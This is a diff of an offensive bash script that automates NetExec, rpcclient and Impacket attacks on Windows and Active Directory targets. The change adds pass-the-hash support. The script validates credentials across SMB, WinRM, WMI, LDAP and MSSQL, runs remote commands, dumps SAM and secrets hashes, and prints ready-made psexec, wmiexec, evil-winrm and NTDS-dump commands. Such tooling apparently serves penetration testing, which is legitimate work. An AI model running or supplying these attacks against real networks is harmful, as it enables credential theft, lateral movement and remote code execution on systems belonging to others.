@@ -1,16 +1,70 @@
 #!/bin/bash
 
-# Check the number of arguments
-if [ "$#" -ne 4 ]; then
-    echo "Usage: ./nxc-auto.sh [IP] [USER] [PASSWD] [DOMAIN]"
+# Default values
+IP=""
+user=""
+pass=""
+domain=""
+hash=""
+
+# Function to display help
+usage() {
+    echo "Usage: $0 -i IP [-u USER] [-p PASSWORD] [-d DOMAIN] [-H HASH]"
+    echo "  -i  Target IP address"
+    echo "  -u  Username"
+    echo "  -p  Password"
+    echo "  -d  Domain"
+    echo "  -H  NTLM Hash"
+    echo "  -h  Show this help message"
     exit 1
+}
+
+# Parse arguments
+while getopts "i:u:p:d:H:h" opt; do
+    case $opt in
+        i) IP="$OPTARG" ;;
+        u) user="$OPTARG" ;;
+        p) pass="$OPTARG" ;;
+        d) domain="$OPTARG" ;;
+        H) hash="$OPTARG" ;;
+        h) usage ;;
+        *) usage ;;
+    esac
+done
+
+# Check if IP is set
+if [ -z "$IP" ]; then
+    echo "Error: IP address is required."
+    usage
 fi
 
+# Build optional flags
+if [ -n "$domain" ]; then
+    DOMAIN_FLAG="-d $domain"
+else
+    DOMAIN_FLAG=""
+fi
 
-IP=$1
-user=$2
-pass=$3
-domain=$4
+if [ -n "$user" ]; then
+    if [ -n "$hash" ]; then
+        USER_FLAG="-u $user -H $hash"
+        RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
+        SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
+        RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
+    elif [ -n "$pass" ]; then
+        USER_FLAG="-u $user -p $pass"
+        RPC_ARG="-U $domain\\\\$user%$pass"
+        SECRETS_ARG="$domain/$user:$pass@$IP"
+        RPCDUMP_ARG="-u $user -p $pass -d $domain"
+    else
+        USER_FLAG="-u $user"
+        RPC_ARG="-U $domain\\\\$user"
+        SECRETS_ARG="$domain/$user@$IP"
+        RPCDUMP_ARG="-u $user -d $domain"
+    fi
+else
+    USER_FLAG=""
+fi
 
 HEADER='\033[95m'
 OKBLUE='\033[94m'
@@ -29,7 +83,7 @@ echo -e "\n\033[96m[+] OS info, Name, Domain, SMB versions\033[0m\n"
 # checks if the SMB service is running; returns OS info, name, domain, SMB versions
 # LDAP domain SID (requires credentials)
 if [ -n "$user" ]; then
-    unbuffer nxc ldap $IP -u "$user" -p "$pass" --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
+    unbuffer nxc ldap $IP $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
 else
     echo -e "\n\033[93m[!] Skipping LDAP domain SID (no credentials supplied)\033[0m"
 fi
@@ -75,12 +129,25 @@ check_and_suggest() {
     if echo "$output" | grep -q "+"; then
         echo -e "\033[92m[+] Valid credentials for $service! Suggested command:\033[0m"
         
+        # Prepare credential strings
+        if [ -n "$hash" ]; then
+            IMPACKET_CREDS="$domain/$user@$IP -hashes :$hash"
+            WINRM_CREDS="-i $IP -u '$user' -H '$hash'"
+            LDAP_IMPACKET="impacket-ldap-shell $domain/$user@$IP -hashes :$hash"
+            SMBCLIENT_AUTH="-U '$domain/$user' --pw-nt-hash '$hash'"
+        else
+            IMPACKET_CREDS="$domain/$user:$pass@$IP"
+            WINRM_CREDS="-i $IP -u '$user' -p '$pass'"
+            LDAP_IMPACKET="impacket-ldap-shell '$domain/$user:$pass@$IP'"
+            SMBCLIENT_AUTH="-U '$domain/$user%$pass'"
+        fi
+
         case $service in
             "smb")
                 # Suggest Impacket tools for SMB
                 echo -e "\033[93m[!] Impacket tools for SMB:\033[0m"
-                echo "impacket-psexec '$domain/$user:$pass@$IP'"
-                echo "impacket-smbexec '$domain/$user:$pass@$IP'"
+                echo "impacket-psexec $IMPACKET_CREDS"
+                echo "impacket-smbexec $IMPACKET_CREDS"
                 
                 # Check for Admin access (Pwn3d!)
                 if echo "$output" | grep -q "Pwn3d!"; then
@@ -110,7 +177,7 @@ check_and_suggest() {
                         share=${share#\\}
                         
                         if [ ! -z "$share" ]; then
-                            echo "smbclient -U '$domain/$user%$pass' //$IP/$share"
+                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share"
                         fi
                     fi
                 done
@@ -121,13 +188,13 @@ check_and_suggest() {
                 else
                      echo -e "\033[93m[!] Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied).\033[0m"
                 fi
-                echo "impacket-wmiexec '$domain/$user:$pass@$IP'"
+                echo "impacket-wmiexec $IMPACKET_CREDS"
                 ;;
             "winrm")
-                echo "evil-winrm -i $IP -u '$user' -p '$pass'"
+                echo "evil-winrm $WINRM_CREDS"
                 ;;
             "mssql")
-                echo "impacket-mssqlclient '$domain/$user:$pass@$IP'"
+                echo "impacket-mssqlclient $IMPACKET_CREDS"
                 ;;
             "ssh")
                 echo "ssh '$user@$IP'"
@@ -140,7 +207,10 @@ check_and_suggest() {
                 ;;
             "ldap")
                 # LDAP usually doesn't have a direct interactive shell, but we can suggest ldapsearch
-                echo "ldapsearch -x -H ldap://$IP -D \"$user@$domain\" -w '$pass' -b \"DC=${domain//./,DC=}\""
+                if [ -z "$hash" ]; then
+                    echo "ldapsearch -x -H ldap://$IP -D \"$user@$domain\" -w '$pass' -b \"DC=${domain//./,DC=}\""
+                fi
+                echo "$LDAP_IMPACKET"
                 ;;
         esac
         echo ""
@@ -149,17 +219,7 @@ check_and_suggest() {
 
 echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
 # Build optional flags
-if [ -n "$domain" ]; then
-    DOMAIN_FLAG="-d $domain"
-else
-    DOMAIN_FLAG=""
-fi
-
-if [ -n "$user" ]; then
-    USER_FLAG="-u $user -p $pass"
-else
-    USER_FLAG=""
-fi
+# Flags already built at the top
 
 # SMB (anonymous allowed, domain optional)
 # Added --shares to check shares in one go
@@ -177,20 +237,20 @@ fi
 # nxc ftp $IP -u $user -p $pass # FTP
 
 echo -e "\n\033[96m[+] RPC Enumeration (rpcclient)\033[0m\n"
-rpcclient -U "$domain\\$user%$pass" $IP -c "queryuser 0" 2>/dev/null # RPC user query
-rpcclient -U "$domain\\$user%$pass" $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
-rpcclient -U "$domain\\$user%$pass" $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
+rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
+rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
+rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
 
 echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
-impacket-secretsdump "$domain/$user:$pass@$IP" 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
+impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
 
 echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
-impacket-rpcdump "$IP" -u "$user" -p "$pass" -d "$domain" 2>/dev/null | tee nxc-enum/smb/rpc-rpcdump.txt # Query RPC endpoint information
+impacket-rpcdump "$IP" $RPCDUMP_ARG 2>/dev/null | tee nxc-enum/smb/rpc-rpcdump.txt # Query RPC endpoint information
 
 if [ -n "$user" ]; then
     echo -e "\n\033[96m[+] WinRM Enumeration:\033[0m"
     echo -e "\n\033[91m[+] WinRM Credentials Check\033[0m\n"
-    check_and_suggest winrm unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG | tee nxc-enum/smb/winrm-credentials.txt
+    check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG | tee nxc-enum/smb/winrm-credentials.txt
 
     echo -e "\n\033[91m[+] WinRM Command Execution (whoami)\033[0m\n"
     unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami | tee nxc-enum/smb/winrm-whoami.txt
@@ -374,7 +434,7 @@ if [ -n "$user" ]; then
     echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"
 
     echo -e "\n\033[91m[+] WMI Credentials Check\033[0m\n"
-    check_and_suggest wmi unbuffer nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt
+    check_and_suggest wmi nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt
 
     echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
     unbuffer nxc wmi $IP $USER_FLAG -x whoami | tee nxc-enum/smb/wmi-whoami.txt
@@ -384,8 +444,11 @@ if [ -n "$user" ]; then
     echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
     unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt
 
-    echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
-    unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
+    echo -e "\n\033[91m[+] NTDS Database Dump (SKIPPED - Risky & Slow)\033[0m\n"
+    echo "Skipping automatic NTDS dump as it can crash the DC and takes a long time."
+    echo "To dump manually (safer): nxc smb $IP $USER_FLAG -M ntdsutil"
+    echo "To dump manually (risky): nxc smb $IP $USER_FLAG --ntds"
+    # unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
 else
     echo -e "\n\033[93m[!] Skipping Additional Enumeration (no username supplied)\033[0m"
 fi
